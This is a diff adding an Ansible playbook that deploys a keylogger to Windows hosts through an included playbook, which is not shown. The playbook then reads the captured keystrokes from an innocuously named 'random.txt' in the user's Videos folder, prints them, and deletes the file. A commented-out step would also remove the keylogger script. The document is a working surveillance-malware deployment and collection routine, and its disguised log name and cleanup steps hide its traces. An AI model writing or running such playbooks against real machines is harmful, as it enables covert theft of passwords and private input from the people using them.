@@ -1,0 +1,35 @@
+---
+- name: Deploy Keylogger and Fetch Logs from Windows
+  hosts: win
+  tasks:
+    - name: Run keylogger_playbook.yml to deploy keylogger
+      include_tasks: keylogger_playbook.yml
+
+#    - name: Wait for keylogger to gather data
+#      pause:
+#        minutes: 1
+
+    - name: Attempt to read keylog.txt (to check if it exists)
+      win_shell: |
+        if (Test-Path -Path "C:\Users\{{ ansible_user }}\Videos\\random.txt") {
+          Get-Content -Path "C:\Users\{{ ansible_user }}\Videos\\random.txt"
+        }
+      register: keylog_output
+
+    - name: Show keylog contents (if available)
+      debug:
+        var: keylog_output.stdout_lines
+      when: keylog_output.stdout is defined and keylog_output.stdout != ''
+
+    - name: Remove the log file from the Windows machine (if it exists)
+      win_shell: |
+        if (Test-Path -Path "C:\Users\{{ ansible_user }}\Videos\\random.txt") {
+          Remove-Item -Path "C:\Users\{{ ansible_user }}\Videos\\random.txt" -Force
+        }
+      when: keylog_output.stdout is defined and keylog_output.stdout != ''
+
+#    - name: Remove keylogger.py from the Windows machine (if it exists)
+#      win_shell: |
+#        if (Test-Path -Path "C:\Users\{{ ansible_user }}\Videos\keylogger.py") {
+#          Remove-Item -Path "C:\Users\{{ ansible_user }}\Videos\keylogger.py" -Force
+#        }
